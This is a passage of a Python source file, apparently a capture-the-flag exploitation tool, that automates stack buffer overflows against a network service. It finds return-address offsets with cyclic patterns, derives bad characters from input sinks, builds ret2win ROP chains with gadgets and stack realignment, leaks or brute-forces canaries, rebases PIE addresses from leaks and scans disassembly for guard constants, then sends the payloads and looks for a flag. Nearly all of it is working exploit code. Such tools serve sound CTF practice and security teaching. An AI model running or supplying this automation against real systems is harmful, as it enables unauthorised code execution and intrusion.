    scan is hopeless."""
    size = 4 if bits == 32 else 8
    pat = de_bruijn(args.offset_end + size * 2)
    try:
        out = send_attempt(args, pat)
    except OSError as exc:
        print(f"[!] cyclic: connection failed: {exc}")
        return None
    for addr in extract_addrs(out):
        for width in (4, 8):
            if width != size:
                continue
            chunk = pack_value(addr, bits, endian)
            idx = pat.find(chunk)
            if 0 <= idx < size:
                # The first bytes of our own input, printed back as a number ("tag: 0x61616161").
                # A return address cannot sit there - at least the buffer lies before it.
                print(f"[*] cyclic: {hex(addr)} is the START of our own input (pattern offset {idx}), "
                      f"echoed back as a number - not a return address; ignored")
                continue
            if idx >= 0:
                print(f"[+] cyclic: leaked {hex(addr)} = pattern offset {idx} -> use --offset {idx}")
                return idx
    # the service may echo the pattern rather than report an address
    print("[!] cyclic: no leaked value matched the pattern.")
    print("    The service must print the saved return address (or echo past it) for this to work.")
    if args.verbose:
        print(printable(out.decode("latin-1", "replace"))[-300:])
    return None


# What each input function silently eats. Getting this wrong means a truncated payload
# and a failure with no explanation, which is the worst kind.
SINK_BADCHARS = {
    "scanf":  b"\x00\x09\x0a\x0b\x0c\x0d\x20",   # %s stops at ANY whitespace
    "gets":   b"\x0a",                                # newline only; NULs pass through
    "fgets":  b"\x0a",
    "strcpy": b"\x00",                                # NUL-terminated copy
    "strcat": b"\x00",
    "sprintf": b"\x00",
}


def auto_badchars(binary):
    """Bytes the target's own input function will truncate on, derived from its sinks."""
    if not binary:
        return b"", ""
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from elftool import ELF
        rep = ELF(binary).report()
    except Exception:
        return b"", ""
    # ONLY the primary sink - the function elftool picked for the offset, i.e. the one
    # that reads OUR input. Unioning across functions is actively harmful: a flag-printing
    # win() calls fgets on a FILE, and a secondary strcpy would add 0x00 - which would skip
    # every 64-bit payload, since every p64() address contains NUL bytes.
    bad, why = b"", []
    for fn in rep.get("vuln_functions", [])[:1]:
        for sink in rep["frames"][fn]["sinks"]:
            for key, chars in SINK_BADCHARS.items():
                if key in sink.lower():
                    for c in chars:
                        if bytes([c]) not in bad:
                            bad += bytes([c])
                    if key not in why:
                        why.append(key)
    return bad, ",".join(why)


def exec_ranges(binary):
    """The binary's OWN executable address ranges, read from its headers.

    Hardcoded guesses like `0x08000000 <= a <= 0x08FFFFFF` only hold for the usual
    i386/x86-64 link bases. A binary linked at an unusual base, or a PIE mapped at
    0x55..., would be misjudged. Ask the ELF instead, and fall back to the common ranges
    only when no binary was supplied."""
    out = []
    if binary:
        try:
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            from elftool import ELF
            e = ELF(binary)
            for sec in e.sections:
                if sec.get("addr") and (sec["flags"] & 0x4):      # SHF_EXECINSTR
                    out.append((sec["addr"], sec["addr"] + max(sec.get("size") or 0, 1)))
        except Exception:
            out = []
    return out


def looks_like_code(addr, binary=None):
    """Is addr plausibly a code pointer? Derived from the ELF when one is available."""
    rs = exec_ranges(binary)
    if rs:
        if any(lo <= addr < hi for lo, hi in rs):
            return True
        # A PIE leak is the same page offset at a different base: compare low bits.
        page = 0xFFF
        return any((addr & ~page) != 0 and (addr & page) == (lo & page) for lo, hi in rs)
    # 0x55.. is where Linux maps a PIE's own text, so it belongs here. 0x7f.. does NOT:
    # that is libc and the stack. Including it made a leaked stack pointer look like a win
    # address and broke live 5002, which had been solving in 19s.
    return (0x08000000 <= addr <= 0x08FFFFFF or 0x00400000 <= addr <= 0x00FFFFFF
            or 0x550000000000 <= addr <= 0x5FFFFFFFFFFF)


def gadgets_for(binary):
    """Gadget addresses from the ELF, or {} if unavailable."""
    if not binary:
        return {}
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from elftool import ELF
        return ELF(binary).gadgets()
    except Exception:
        return {}


def build_ret2win(off, addr, bits, endian, win_arg, align, gad, filler=b"A"):
    """A*off + the chain that calls addr. win_arg may be one value or a list of them.

    Plain ret2win is `A*off + p(addr)`. Two in-syllabus cases need more than one slot:
      win(arg)  -> 64-bit: pop rdi; ret -> arg -> win.  32-bit cdecl: win -> ret -> arg.
      alignment -> 64-bit callees using SSE fault unless RSP is 16-byte aligned at the
                   call; returning through one extra bare `ret` fixes it.
    Returns None when a required gadget is missing, so the caller can skip cleanly."""
    p = lambda v: pack_value(v, bits, endian)
    chain = b""
    if align:
        rets = gad.get("ret")
        if not rets:
            return None
        chain += p(rets[0])
    args_list = ([] if win_arg is None else
                 list(win_arg) if isinstance(win_arg, (list, tuple)) else [win_arg])
    if not args_list:
        chain += p(addr)
    elif bits == 64:
        # SysV-64: first three integer args go in rdi, rsi, rdx. One gadget per register,
        # chained. win(a, b) is the natural escalation from win(key) and needs two.
        regs = ["pop rdi; ret", "pop rsi; ret", "pop rdx; ret"]
        if len(args_list) > len(regs):
            return None
        combo = gad.get("pop rdi; pop rsi; ret")
        if len(args_list) == 2 and combo:
            chain += p(combo[0]) + p(args_list[0]) + p(args_list[1]) + p(addr)
        else:
            for reg, val in zip(regs, args_list):
                pops = gad.get(reg)
                if not pops:
                    return None
                chain += p(pops[0]) + p(val)
            chain += p(addr)
    else:
        # cdecl: [win][fake ret][arg1][arg2]... - arguments simply sit on the stack.
        chain += p(addr) + p(0x41414141) + b"".join(p(v) for v in args_list)
    return filler * off + chain


def run_bof(args, report, leaked):
    bits, endian = detect_arch(args, report)
    addrs, addr_src = choose_addresses(args, report, leaked)
    offsets, off_src = choose_offsets(args, report)
    if not addrs:
        print("[!] no target address. Provide --addr or use --recon to find the leak.")
        cb = getattr(args, "_crash_bound", None)
        if cb is not None:
            # Not nothing: the service survives short input and dies on long input, at a
            # measured length. That IS a stack overflow, and it bounds the offset.
            said = getattr(args, "_crash_said", "")
            if said and "stack smashing" not in said and "Segmentation" not in said:
                print(f"[!] DIAGNOSIS: input longer than {cb} bytes makes the service ANSWER DIFFERENTLY - "
                      f"it says {said!r} instead of finishing normally.")
                print("[!] If that reads like a refusal, this is a LENGTH CHECK, not an overflow: nothing "
                      "crashed and there is no return address to aim at. Look for the bug elsewhere "
                      "(another prompt, a format string) or move on.")
                print("[!] If it reads like an error from a damaged program, the overflow is real and the "
                      "lines below apply.")
            else:
                print(f"[!] DIAGNOSIS: input longer than {cb} bytes CRASHES the service - a stack "
                      f"overflow, with the return address at or shortly after offset {cb}."
                      + (" (The program reports a smashed stack: it has a CANARY.)" if "stack smashing" in said else ""))
            if getattr(args, "binary", None):
                # Saying "no binary was given" here was simply false.
                print("[!] What is missing is somewhere to return to: this binary has no win()-like "
                      "function. That makes it a shellcode or ret2libc question, and those use "
                      "addresses that change on every connection - RUN THE SAME COMMAND AGAIN "
                      "before concluding anything.")
            else:
                print("[!] What is missing is somewhere to return to: no binary was given and the "
                      "service prints no address.")
            print("[!] Easiest: run  python3 go.py  again and, when it asks what the paper says, type "
                  "the address, e.g.  win() is at 0x401186")
            # The command must walk the same prompts this run did, or it lands on the wrong one.
            walk = " ".join("--talk " + shlex.quote(t) for t in (args.talk or []))
            print("[!] Or, with the binary or any address of win(), this one command (replace 0xWIN):")
            print(f"[!]     python3 {os.path.abspath(__file__)} --host {args.host} --port {args.port} "
                  f"--goal ret2win --addr 0xWIN --offset-start {cb - cb % 4} --offset-end {cb - cb % 4 + 40} --step 4"
                  + (" " + walk if walk else ""))
        return 1
    print(f"[*] mode=bof arch={bits} endian={endian} addresses={[hex(a) for a in addrs]} ({addr_src})")
    print(f"[*] offsets={offsets[:12]}{'...' if len(offsets) > 12 else ''} ({off_src})")

    # Padding bytes to try, in order. An explicit --filler goes first; otherwise 'A' is
    # tried and the list advances only when the service says the input was rejected.
    fillers = ((esc_bytes(args.filler),) + FILLERS) if args.filler else FILLERS
    fill_idx = 0

    if args.dry_run:
        gad = gadgets_for(args.binary)
        wa = int(args.win_arg, 0) if args.win_arg else None
        for off in offsets:
            for addr in addrs:
                payload = build_ret2win(off, addr, bits, endian, wa, args.align, gad,
                                        filler=fillers[fill_idx])
                print(f"[dry] off={off} addr={hex(addr)} len={len(payload) if payload else 0} payload={payload!r}")
        return 0

    gad = gadgets_for(args.binary)
    auto_bad, bad_why = auto_badchars(args.binary)
    bad_set = set(esc_bytes(args.badchars)) | set(auto_bad)
    if auto_bad:
        print(f"[*] sink is {bad_why}: bytes {' '.join(f'{b:#04x}' for b in sorted(auto_bad))} "
              f"would truncate the payload")
    win_arg = [int(v, 0) for v in args.win_arg] if args.win_arg else None
    pie_mode = addr_src == "PIE rebased from leak"
    if pie_mode:
        print("[*] PIE: recomputing the load base from each connection's own leak")
    elif bits == 64 and not args.binary and addr_src in ("paper notes", "cli", "banner-leak"):
        # 64-bit with NO binary: no file to find a `ret` gadget in, and none to disassemble
        # for the instruction after `push rbp`. That instruction is 1 byte into a plain
        # function and 5 into one that starts with `endbr64`, so those two are tried after
        # the address as given. Same payload length, no gadget needed.
        for a_ in list(addrs):
            for skip in (1, 5):
                if a_ + skip not in addrs:
                    addrs.insert(addrs.index(a_) + (1 if skip == 1 else 2), a_ + skip)
        print(f"[*] 64-bit, no binary: also trying +1 and +5 past each address "
              f"({', '.join(hex(x) for x in addrs[:6])}) - alignment without a gadget")
    elif bits == 64 and args.binary and not args.addr:
        # Second way to fix 64-bit alignment, tried right after each plain address: enter
        # the function just past its `push rbp`. Same payload length as the plain chain.
        for a_ in list(addrs):
            le = late_entry(args.binary, a_)
            if le and le not in addrs:
                addrs.insert(addrs.index(a_) + 1, le)
                print(f"[*] also trying {hex(le)} (just past `push rbp` of {hex(a_)}): "
                      f"realigns without a longer payload")
    # A canary is per-process, so it must be read from the same connection as the payload.
    canary_re = args.canary_regex or CANARY_RE
    canary_mode = False
    if not args.no_canary:
        try:
            b0 = banner_with_gates(args)
            canary_mode = bool(re.search(canary_re, b0.decode("latin-1", "replace")))
        except OSError:
            pass
    canary_value = None
    if args.brute_canary:
        c_off = (offsets[0] if offsets else 0) - 16
        canary_value = brute_canary(args, bits, c_off)
        if canary_value is not None:
            canary_mode = True
            canary_offs = [c_off]
    canary_offs = locals().get("canary_offs", [])
    if canary_mode and not canary_offs and offsets:
        print("[*] canary leaked in the banner: writing it back in place")
        canary_offs = [o for o in (offsets[0] - 16, offsets[0] - 12, offsets[0] - 8,
                                   offsets[0] - 20, offsets[0] - 24) if o >= 0]
    # Ordered escalation, cheapest first. Each pass is (realign?, argument-to-win).
    passes = [(args.align, win_arg)]
    if win_arg is None:
        if not args.align and bits == 64 and gad.get("ret"):
            passes.append((True, None))          # 64-bit movaps alignment
        # win(key): the expected key is itself a cmp-immediate in the binary, so try the
        # same constants --goal var would use. Capped - each one costs a whole scan.
        if gad.get("pop rdi; ret") or bits == 32:
            for m in (extract_magic(args.binary) if args.binary else [])[:2]:
                passes.append((args.align, m))
            for m in paper("number")[:2]:
                if (args.align, m) not in passes:
                    passes.append((args.align, m))

    # (canary slots are now tried inside the payload builder, per offset)
    if (args.binary and win_arg is None and not canary_mode and not pie_mode
            and not args.dry_run and win_wants_runtime_arg(args.binary)):
        print("[*] win() compares its argument with a run-time value: passing each number "
              "the banner prints")
        try:
            rt_consts = list(extract_win_args(args.binary) or [])[:2]
        except Exception:                             # noqa: BLE001
            rt_consts = []
        for off in offsets[:max(1, min(getattr(args, "_derived", 0), 4))]:
            for addr in addrs[:2]:
                for al in ((False, True) if bits == 64 and gad.get("ret") else (False,)):
                    # win(key) is the plain case. win(a, b) with one CONSTANT and one
                    # announced value needs both, in either order - the constants come
                    # from win()'s own compares, as they do for the all-constant case.
                    shapes = [lambda n: n]
                    if rt_consts:
                        shapes += [lambda n: rt_consts + [n], lambda n: [n] + rt_consts]
                    for k in range(3 * len(shapes)):
                        cell = {}

                        def maker(banner, _k=k // len(shapes), _sh=shapes[k % len(shapes)],
                                  _o=off, _a=addr, _al=al, _c=cell):
                            nums = banner_numbers(banner, args.binary)
                            if _k >= len(nums):
                                _c["none"] = True
                                return None
                            _c["v"] = nums[_k]
                            _c["p"] = build_ret2win(_o, _a, bits, endian, _sh(nums[_k]), _al, gad)
                            return _c["p"]
                        out = b""
                        for _again in range(4):
                            cell.clear()
                            try:
                                out = send_attempt(args, b"A" * off, make=maker, followup=True)
                            except OSError:
                                continue
                            if b"\n" not in (cell.get("p") or b""):
                                break
                        if cell.get("none") or cell.get("p") is None:
                            break
                        if report_flag(args, cell["p"], out,
                                       f"off={off} addr={hex(addr)} win-arg={hex(cell['v'])} from the banner"):
                            return 0
    attempts, skipped = 0, []
    # Offsets read from the frame are almost always right, so each of those gets EVERY
    # variant (plain, realigned, with an argument) before the blind sweep starts. The old
    # order swept ~120 offsets with the plain chain first; a 64-bit win() that needs the
    # realigning `ret` had the correct offset first in the list and still timed out,
    # because its second variant was queued behind the whole sweep.
    nd = min(getattr(args, "_derived", 0), 4, len(offsets)) if len(passes) > 1 else 0
    schedule = [(pi, passes[pi], [off]) for off in offsets[:nd] for pi in range(len(passes))]
    schedule += [(pi, passes[pi], offsets[nd:]) for pi in range(len(passes))]
    for idx, (align, win_arg), offs_now in schedule:
        if idx and len(offs_now) > 1:
            extra = f"win-arg {hex(win_arg)}" if win_arg is not None else "realigning `ret`"
            print(f"[*] escalating: retry with {extra}")
        for off in offs_now:
            for addr in addrs:
                if attempts >= args.max_attempts:
                    print(f"[!] max attempts ({args.max_attempts}) reached")
                    return 1
                attempts += 1
                maker = None
                built_cell = {}        # maker records the real bytes here
                if canary_mode:
                    def maker(banner, _off=off, _a=addr, _al=align, _wa=win_arg):
                        if canary_value is not None:
                            cv = canary_value
                        else:
                            m = re.search(canary_re, banner.decode("latin-1", "replace"))
                            if not m:
                                return None
                            cv = int(m.group(1), 16)
                        tgt = _a
                        if pie_mode:
                            live = pie_win_addrs(args.binary, extract_addrs(banner))
                            if not live:
                                return None
                            tgt = live[0]
                        # The canary sits just below the saved return address, so its
                        # slot follows THIS attempt's offset - deriving it from the first
                        # candidate put it at a negative index whenever the offset was
                        # being scanned rather than pinned.
                        slots = canary_offs or [_off - 16, _off - 12, _off - 8,
                                                _off - 20, _off - 24]
                        for co in [c for c in slots if c >= 0]:
                            pl = build_with_canary(_off, tgt, co, cv, bits, endian, _wa, _al,
                                                   pie_gadgets(gad) if pie_mode else gad)
                            if pl is not None:
                                built_cell["p"] = pl
                                return pl
                        return None
                    payload = b"A" * off
                elif pie_mode:
                    def maker(banner, _off=off, _al=align, _wa=win_arg):
                        live = pie_win_addrs(args.binary, extract_addrs(banner))
                        if not live:
                            return None
                        pl = build_ret2win(_off, live[0], bits, endian, _wa, _al, pie_gadgets(gad))
                        built_cell["p"] = pl
                        return pl
                    payload = b"A" * off          # placeholder; maker() replaces it
                else:
                    payload = build_ret2win(off, addr, bits, endian, win_arg, align, gad,
                                            filler=fillers[fill_idx])
                if payload is None:
                    print(f"[!] need a {'pop rdi; ret' if win_arg is not None else 'ret'} gadget; none in the binary")
                    return 1
                bad = [b for b in payload if b in bad_set]
                if bad:
                    skipped.append((off, addr, bad))
                    log(args, f"skip off={off} addr={hex(addr)}: badchars {bad}")
                    continue
                log(args, f"try off={off} addr={hex(addr)} len={len(payload)} align={align}")
                try:
                    out = send_attempt(args, payload, make=maker, followup=True)
                    # A payload built from THIS connection's leak (canary, PIE base) can
                    # contain a byte the input function stops on - a random canary holds a
                    # newline about once in 80 connections - and it was sent anyway,
                    # truncated. The secret is re-rolled per connection, so reconnect.
                    for _again in range(3):
                        built = built_cell.get("p")
                        if not built or not any(b in bad_set for b in built):
                            break
                        log(args, "leak-built payload contains a truncating byte; reconnecting")
                        built_cell.clear()
                        out = send_attempt(args, payload, make=maker, followup=True)
                except OSError as exc:
                    log(args, f"connection error: {exc}")
                    continue
                shown = built_cell.get("p", payload)    # report what was really sent
                if report_flag(args, shown, out, f"off={off} addr={hex(addr)}{' +align' if align else ''}"):
                    return 0
                # The service polices its input: the padding byte is the usual reason, so
                # move to the next filler and retry this offset rather than sweeping on
                # with a byte that will be refused every time.
                if (REJECTED.search(out) and not CRASHED.search(out)
                        and fill_idx + 1 < len(fillers)):
                    fill_idx += 1
                    print(f"[*] input was rejected; switching filler to "
                          f"{fillers[fill_idx]!r} and retrying")
                    retry = build_ret2win(off, addr, bits, endian, win_arg, align, gad,
                                          filler=fillers[fill_idx])
                    if retry is not None and not [x for x in retry if x in bad_set]:
                        try:
                            out = send_attempt(args, retry, make=maker, followup=True)
                        except OSError as exc:
                            log(args, f"connection error: {exc}")
                            continue
                        if report_flag(args, built_cell.get("p", retry), out,
                                       f"off={off} addr={hex(addr)} filler={fillers[fill_idx]!r}"):
                            return 0
                if args.verbose:
                    print(printable(out.decode("latin-1", "replace"))[-300:])
    print(f"[!] no flag after {attempts} attempts")
    if skipped:
        uniq = sorted({a for _o, a, _b in skipped})
        bs = sorted({b for _o, _a, bl in skipped for b in bl})
        print(f"[!] {len(skipped)} payload(s) were SKIPPED because the target address "
              f"contains a byte this sink truncates on: {' '.join(f'{b:#04x}' for b in bs)}")
        print(f"[!] affected address(es): {', '.join(hex(a) for a in uniq[:4])}")
        print("[!] that address cannot be delivered through this input function - you need "
              "a different target (another gadget/symbol) or a different input path.")
    print("[!] next: --dry-run, try other offsets/addrs, check ASLR/PIE/canary, or use GDB locally")
    return 1


def extract_magic(binary, limit=8):
    """Guard immediates compared against a register (`cmp eax,0xIMM`) - the value an
    adjacent-field overwrite must write. Lets `--goal var` run without --value.
    Skips 0 and all-ones masks; returns distinct candidates in first-seen order."""
    try:
        txt = subprocess.run(["objdump", "-d", "-M", "intel", binary],
                             capture_output=True, text=True, timeout=20).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    # Addresses in the binary's own load range are not guard values. Without this filter a
    # 64-bit var guard yields `0x404050` (a .data address) and the overwrite writes garbage.
    ranges = []
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from elftool import ELF
        for sec in ELF(binary).sections:
            if sec.get("addr"):
                ranges.append((sec["addr"], sec["addr"] + max(sec.get("size") or 0, 1)))
    except Exception:
        pass

    def is_addr(v):
        return any(lo <= v < hi for lo, hi in ranges)

    out = []
    for m in re.finditer(r"\bcmp\s+[^,\n]+,\s*0x([0-9a-fA-F]+)\b", txt):
        v = int(m.group(1), 16)
        if 0x100 <= v <= 0xFFFFFFFF and v != 0xFFFFFFFF and not is_addr(v) and v not in out:
            out.append(v)
    if out:
        return out[:limit]

    # Fallback: a 64-bit guard compiles to `mov $0xfeedface,%eax` + `cmp %rax,mem`, so the
    # value never appears in a cmp operand. Take mov-immediates that a cmp/test uses soon
    # after - checked against the real disassembly, not guessed from the source.
    lines = txt.splitlines()
    for i, line in enumerate(lines):
        m = re.search(r"\bmov\s+[^,\n]*,\s*0x([0-9a-fA-F]+)\b", line) or \
            re.search(r"\bmov\s+\$?0x([0-9a-fA-F]+)\s*,", line)
        if not m:
            continue
        v = int(m.group(1), 16)
        if not (0x100 <= v <= 0xFFFFFFFF) or v == 0xFFFFFFFF or is_addr(v) or v in out:
            continue
        if any(re.search(r"\b(cmp|test)\b", lines[j]) for j in range(i + 1, min(i + 6, len(lines)))):
            out.append(v)
    return out[:limit]


def extract_win_args(binary, limit=4):
    """Guard constants INSIDE a win-like function, in the order the code checks them.

    `win(a, b)` with 64-bit constants does not compile to `cmp reg, imm`: gcc emits
    `mov $0xdeadbeef, %eax` then `cmp %rax, mem`, so extract_magic() sees nothing. Scanning
    the win function's own disassembly for both forms recovers the argument values, in
    argument order, which is what a two-pop ROP chain needs."""
    try:
        txt = subprocess.run(["objdump", "-d", "-M", "intel", binary],
                             capture_output=True, text=True, timeout=20).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    # Only the win-like function's body, so ordinary constants elsewhere are not picked up.
    body, grabbing = [], False
    for line in txt.splitlines():
        m = re.match(r"^[0-9a-f]+ <([^>]+)>:", line)
        if m:
            grabbing = any(k in m.group(1).lower() for k in ("win", "flag", "secret"))
            continue
        if grabbing:
            body.append(line)
    blob = "\n".join(body)
    out = []
    for m in re.finditer(r"\b(?:cmp|mov)\s+[^,\n]+,\s*0x([0-9a-fA-F]+)\b", blob):
        v = int(m.group(1), 16)
        if 0x1000 <= v <= 0xFFFFFFFF and v != 0xFFFFFFFF and v not in out:
            out.append(v)
    return out[:limit]


def extract_win_ptr_args(binary, limit=4):
    """Addresses of STRING literals that a win-like function references.

    `win(char *key)` with `strcmp(key, "open-sesame")` needs a POINTER argument, not an
    integer, so the chain must pass the address of a literal that already exists in
    .rodata. win()'s own code references it (`lea 0xdd0(%rip),%rdx  # 402008`), and
    objdump resolves the target in its comment, so the address is read rather than guessed.
    Returns addresses whose bytes really are a printable string, in first-seen order."""
    try:
        txt = subprocess.run(["objdump", "-d", "-M", "intel", binary],
                             capture_output=True, text=True, timeout=20).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    body, grabbing = [], False
    for line in txt.splitlines():
        m = re.match(r"^[0-9a-f]+ <([^>]+)>:", line)
        if m:
            grabbing = any(k in m.group(1).lower() for k in ("win", "flag", "secret"))
            continue
        if grabbing:
            body.append(line)

    def string_at(addr):
        """The printable C string living at addr, or None."""
        try:
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            from elftool import ELF
            e = ELF(binary)
            for sec in e.sections:
                base, size = sec.get("addr") or 0, sec.get("size") or 0
                if base and base <= addr < base + size and sec.get("offset"):
                    raw = e.data[sec["offset"] + (addr - base):][:64]
                    end = raw.find(b"\x00")
                    cand = raw[:end if end >= 0 else len(raw)]
                    if len(cand) >= 3 and all(32 <= c < 127 for c in cand):
                        return cand
        except Exception:
            pass
        return None

    out = []
    for line in body:
        for hx in re.findall(r"0x([0-9a-fA-F]{4,})\b", line) + re.findall(r"#\s*([0-9a-f]{4,})\b", line):
            v = int(hx, 16)
            if v in out:
                continue
            if string_at(v):
                out.append(v)
    return out[:limit]


_SIZES = {"BYTE": 1, "WORD": 2, "DWORD": 4, "QWORD": 8}
# What FILLS a buffer: the input functions, and the copies that move input into a smaller
# one (`fgets(tmp); strcpy(buf, tmp)` - the overflow is the copy, and the guard sits in
# the copy's frame, not the read's). The destination is the last lea before the call.
_INPUT_SINK = re.compile(r"^(?:vuln_)?gets$|^fgets$|^read$|^fread$|^recv$|scanf|"
                         r"^strcpy$|^strcat$|^memcpy$|^sprintf$|^stpcpy$", re.I)


def _reg_family(reg):
    """eax/rax/ax/al -> 'a'; esi/rsi/sil -> 'si'; r8d -> 'r8'. Lets a `mov eax,[..]` be
    matched to the `cmp al,..` or `test rax,rax` that follows."""
    reg = reg.lower()
    for a in "abcd":
        if reg in (a + "l", a + "h", a + "x", "e" + a + "x", "r" + a + "x"):
            return a
    m = re.match(r"^(r\d+)[dwb]?$", reg)
    if m:
        return m.group(1)
    return re.sub(r"^[er]", "", reg).rstrip("l")


def frame_guards(binary):
    """What the code COMPARES on its own stack frame after reading input, per function:

        [{"func": name, "bufs": [Y, ...], "fields": [(X, size, value), ...]}]

    Y / X are distances below the frame pointer, so a field sits (Y - X) bytes into the
    overflow. value is the compared constant, None for "tested against zero", or the
    string "cmd" for a buffer handed to system().

    extract_magic() only reports constants >= 0x100 and says nothing about WHERE they
    live. That misses the commonest baby overflows outright: `if (authenticated)`,
    `if (level == 1)`, the lab's own `if (i == '1')` on a char, and a guard made of two
    fields. Reading the frame gives the offset, the width and the value together."""
    try:
        txt = subprocess.run(["objdump", "-d", "-M", "intel", "--no-show-raw-insn", binary],
                             capture_output=True, text=True, timeout=20).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    funcs, cur = {}, None
    for line in txt.splitlines():
        m = re.match(r"^[0-9a-f]+ <([^>]+)>:", line)
        if m:
            cur = m.group(1)
            funcs[cur] = []
        elif cur and "\t" in line:
            funcs[cur].append(line.split("\t", 1)[1].strip())
    imm = r"(0x[0-9a-fA-F]+|\d+)"
    mem = r"(BYTE|WORD|DWORD|QWORD) PTR \[[er]bp-0x([0-9a-f]+)\]"
    out = []
    for name, lines in funcs.items():
        if name.startswith("_") or "@plt" in name or name in ("vuln_gets", "frame_dummy"):
            continue
        bufs, fields, last_lea = [], [], None
        read_at = {}                 # buffer -> index of the call that fills it

        def add(x, size, val, i):
            if not any(f[0] == x for f in fields):
                fields.append((x, size, val, i))

        for i, ln in enumerate(lines):
            m = re.match(r"lea\s+(\w+),\s*\[[er]bp-0x([0-9a-f]+)\]", ln)
            if m:
                last_lea = [int(m.group(2), 16), i, m.group(1)]
            # A struct member is addressed as base + offset: `lea eax,[ebp-0x48]` then
            # `add eax,0x20`. Without the add, the member looks like the struct's start.
            m = re.match(r"add\s+(\w+),\s*" + imm + r"$", ln)
            if m and last_lea and m.group(1) == last_lea[2] and i - last_lea[1] <= 2:
                last_lea[0] -= int(m.group(2), 0)
            m = re.match(r"call\s+[0-9a-f]+ <([A-Za-z_][\w.]*?)(?:@plt)?>", ln)
            if m and last_lea and i - last_lea[1] <= 6:
                callee = m.group(1)
                if _INPUT_SINK.search(callee):
                    if last_lea[0] not in bufs:
                        bufs.append(last_lea[0])
                    read_at.setdefault(last_lea[0], i)
                elif callee in ("system", "popen"):
                    add(last_lea[0], 0, "cmd", i)
                elif callee in ("strcmp", "strncmp", "memcmp", "strcasecmp", "strncasecmp"):
                    add(last_lea[0], 0, "str", i)
            m = re.match(r"cmp\s+" + mem + r",\s*" + imm + r"$", ln)
            if m:
                v = int(m.group(3), 0)
                add(int(m.group(2), 16), _SIZES[m.group(1)], v if v else None, i)
                continue
            m = re.match(r"mov(?:zx|sx|sxd)?\s+(\w+),\s*" + mem + r"$", ln)
            if not m:
                continue
            fam, size, x = _reg_family(m.group(1)), _SIZES[m.group(2)], int(m.group(3), 16)
            for j in range(i + 1, min(i + 4, len(lines))):
                nx = lines[j]
                if re.match(r"(call|jmp|ret|j[a-z]+)\b", nx):
                    break
                c = re.match(r"cmp\s+(\w+),\s*" + imm + r"$", nx)
                if c and _reg_family(c.group(1)) == fam:
                    v = int(c.group(2), 0)
                    add(x, size, v if v else None, j)
                    break
                c = re.match(r"test\s+(\w+),\s*(\w+)$", nx)
                if c and _reg_family(c.group(1)) == fam == _reg_family(c.group(2)):
                    add(x, size, None, j)
                    break
                # 64-bit magic: mov rax,[rbp-8]; mov edx,0xfeedface; cmp rax,rdx
                c = re.match(r"cmp\s+(\w+),\s*(\w+)$", nx)
                if c and fam in (_reg_family(c.group(1)), _reg_family(c.group(2))):
                    other = c.group(2) if _reg_family(c.group(1)) == fam else c.group(1)
                    found = False
                    for k in range(max(0, i - 2), j):
                        mv = re.match(r"mov(?:abs)?\s+(\w+),\s*" + imm + r"$", lines[k])
                        if mv and _reg_family(mv.group(1)) == _reg_family(other):
                            add(x, size, int(mv.group(2), 0), j)
                            found = True
                    if not found:
                        # Compared with a value that is not in the code at all: a global
                        # or another variable, set at run time. If the service announces
                        # it ("Session code: 0x..."), it has to be READ per connection.
                        add(x, size, "dyn", j)
                    break
        if bufs and fields:
            out.append({"func": name, "bufs": bufs, "fields": fields, "read_at": read_at})
    return out


def paper(kind=None):
    """Facts from the question paper, if any were given: values of one kind, or all facts."""
    try:
        import notes as _notes
        facts = _notes.load()
    except Exception:                                 # noqa: BLE001
        return []
    return facts if kind is None else [f["value"] for f in facts if f["kind"] == kind]


def banner_numbers(banner, binary=None):
    """Numbers the service printed on THIS connection, in order: hex tokens and decimals
    of 3+ digits. Addresses inside the binary are dropped - a printed win() address is
    somewhere to jump, not a value to write."""
    out, small = [], []
    for m in re.finditer(rb"0[xX]([0-9a-fA-F]{1,16})|(?<![0-9a-fA-Fx])(\d{1,10})(?![0-9a-fA-F])", banner or b""):
        v = int(m.group(1), 16) if m.group(1) else int(m.group(2))
        if binary and m.group(1) and looks_like_code(v, binary):
            continue
        # "Your lucky number today is 42." is a value too. Short decimals are also what
        # menus and counters are made of, so they go after the hex and long ones.
        dest = small if (not m.group(1) and len(m.group(2)) < 3) else out
        if v not in out and v not in small:
            dest.append(v)
    # What the PAPER says (notes.py, via solve.py --notes / go.py) comes first: someone
    # read it and typed it in, which is better evidence than any number in a banner.
    told = [v for v in paper("number") if v not in out and v not in small]
    return told + [v for v in out if v not in told] + [v for v in small if v not in told]


def win_wants_runtime_arg(binary):
    """Does a win-like function compare its ARGUMENT with something that is not a constant
    (`if (k != key)` with key set at run time)? Then the argument must come off the wire."""
    try:
        from elftool import ELF
        e = ELF(binary)
        txt = subprocess.run(["objdump", "-d", "-M", "intel", "--no-show-raw-insn", binary],
                             capture_output=True, text=True, timeout=20).stdout
    except Exception:                                 # noqa: BLE001
        return False
    for name in e.win_symbols:
        m = re.search(r"^[0-9a-f]+ <%s>:\n(.*?)(?:\n\n|\Z)" % re.escape(name), txt, re.S | re.M)
        if not m:
            continue
        body = [l.split("\t", 1)[-1].strip() for l in m.group(1).splitlines()][:16]
        uses_arg = any(re.search(r"\[ebp\+0x8\]|,\s*[er]di$", l) for l in body)
        cmps = [l for l in body if l.startswith("cmp")]
        # ANY compare without an immediate counts: in win(a, b) the first one may well be
        # against a constant (`a != 0xC0DE`) and only the second against the run-time key.
        # ...but `mov edx,0xfeedface; cmp rax,rdx` IS a constant, just loaded first (how
        # gcc compares 64-bit values), so a register compare only counts when no
        # immediate was moved into either side just before it.
        for i, l in enumerate(body):
            if not l.startswith("cmp") or re.search(r",\s*(0x[0-9a-f]+|\d+)$", l):
                continue
            regs = {_reg_family(r) for r in re.findall(r"\b([er]?[a-ds][xil]|[er][sd]i|r\d+d?)\b", l)}
            loaded = any(_reg_family(m_.group(1)) in regs for m_ in
                         (re.match(r"mov(?:abs)?\s+(\w+),\s*(?:0x[0-9a-f]+|\d+)$", p)
                          for p in body[max(0, i - 3):i]) if m_)
            if uses_arg and not loaded:
                return True
    return False


def late_entry(binary, addr):
    """The address just after `push rbp` in the function at `addr`, or None.
